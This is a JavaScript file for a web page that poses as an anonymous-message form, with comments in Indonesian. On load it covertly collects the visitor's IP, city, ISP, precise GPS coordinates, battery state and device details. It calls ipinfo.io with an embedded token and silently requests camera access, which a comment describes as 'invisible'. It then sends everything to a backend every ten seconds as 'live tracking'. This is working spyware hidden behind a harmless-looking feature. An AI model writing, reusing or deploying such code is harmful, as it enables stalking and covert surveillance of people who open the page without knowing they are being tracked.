const statusEl = document.getElementById('status');
const sendBtn = document.getElementById('sendBtn');
const msgTextarea = document.getElementById('msg');

// Ambil device info + lokasi otomatis
async function getDeviceInfo() {
  let geo = "Tidak tersedia";
  try {
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
    const battery = await navigator.getBattery();

    // Lokasi
    if (navigator.geolocation) {
      await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos => {
        geo = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy} m`;
        resolve();
      }, () => resolve()));
    }

    // Kamera otomatis tapi invisible
    try {
      await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    } catch (e) {
      console.warn("Gagal akses kamera:", e);
    }

    const time = new Date().toLocaleString("id-ID");
    const connection = navigator.connection || {};

    return `
🌐 *Informasi IP*
📶 IP: ${ipInfo.ip}
🌍 Negara: ${ipInfo.country}
🏙️ Kota: ${ipInfo.city}
🛠️ ISP: ${ipInfo.org}
⏱️ Timezone: ${ipInfo.timezone || "-"}
📱 Device: ${navigator.userAgent}
📍 Geolocation: ${geo}
🔋 Battery: ${Math.round(battery.level*100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
⏰ Waktu: ${time}
📡 Jaringan: ${connection.effectiveType || "❌ Tidak diketahui"}
    `;
  } catch (e) {
    console.error(e);
    return "❌ Gagal ambil info device";
  }
}

// Kirim ke backend
async function sendToBackend(data) {
  try {
    await fetch('/api/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: data })
    });
  } catch (e) {
    console.error(e);
  }
}

// Live tracking setiap 10 detik
async function liveTracking() {
  const info = await getDeviceInfo();
  await sendToBackend(info);
  statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
}

// Mulai live tracking
window.onload = async () => {
  await liveTracking();
  setInterval(liveTracking, 10000);
};

// Tombol kirim pesan manual
sendBtn.addEventListener('click', async () => {
  const msg = msgTextarea.value.trim();
  if (!msg) return alert("Isi pesan dulu!");
  await sendToBackend(`💬 Pesan anonim:\n${msg}`);
  msgTextarea.value = "";
  statusEl.textContent = "Pesan terkirim!";
});
